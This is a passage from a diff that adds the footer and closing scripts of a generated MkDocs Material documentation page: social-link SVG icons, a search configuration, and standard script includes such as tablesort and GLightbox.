3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/thomasfieber" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://discord.gg/XvAFFw6A" target="_blank" rel="noopener" title="discord.gg" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M492.5 69.8c-.2-.3-.4-.6-.8-.7-38.1-17.5-78.4-30-119.7-37.1-.4-.1-.8 0-1.1.1s-.6.4-.8.8c-5.5 9.9-10.5 20.2-14.9 30.6-44.6-6.8-89.9-6.8-134.4 0-4.5-10.5-9.5-20.7-15.1-30.6-.2-.3-.5-.6-.8-.8s-.7-.2-1.1-.2C162.5 39 122.2 51.5 84.1 69c-.3.1-.6.4-.8.7C7.1 183.5-13.8 294.6-3.6 404.2c0 .3.1.5.2.8s.3.4.5.6c44.4 32.9 94 58 146.8 74.2.4.1.8.1 1.1 0s.7-.4.9-.7c11.3-15.4 21.4-31.8 30-48.8.1-.2.2-.5.2-.8s0-.5-.1-.8-.2-.5-.4-.6-.4-.3-.7-.4c-15.8-6.1-31.2-13.4-45.9-21.9-.3-.2-.5-.4-.7-.6s-.3-.6-.3-.9 0-.6.2-.9.3-.5.6-.7c3.1-2.3 6.2-4.7 9.1-7.1.3-.2.6-.4.9-.4s.7 0 1 .1c96.2 43.9 200.4 43.9 295.5 0 .3-.1.7-.2 1-.2s.7.2.9.4c2.9 2.4 6 4.9 9.1 7.2.2.2.4.4.6.7s.2.6.2.9-.1.6-.3.9-.4.5-.6.6c-14.7 8.6-30 15.9-45.9 21.8-.2.1-.5.2-.7.4s-.3.4-.4.7-.1.5-.1.8.1.5.2.8c8.8 17 18.8 33.3 30 48.8.2.3.6.6.9.7s.8.1 1.1 0c52.9-16.2 102.6-41.3 147.1-74.2.2-.2.4-.4.5-.6s.2-.5.2-.8c12.3-126.8-20.5-236.9-86.9-334.5zm-302 267.7c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.4 59.2-52.8 59.2m195.4 0c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.2 59.2-52.8 59.2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.instant", "navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "navigation.top", "search.suggestions", "search.highlight", "navigation.footer", "content.code.copy", "content.code.annotate", "content.code.tabs"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.92b07e13.min.js"></script>
+      
+        <script src="https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js"></script>
+      
+        <script src="../../../../javascripts/tablesort.js"></script>
+      
+        <script src="../../../../javascripts/extra.js"></script>
+      
+    
+  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(() => { lightbox.reload() });
+</script></body>
+</html>
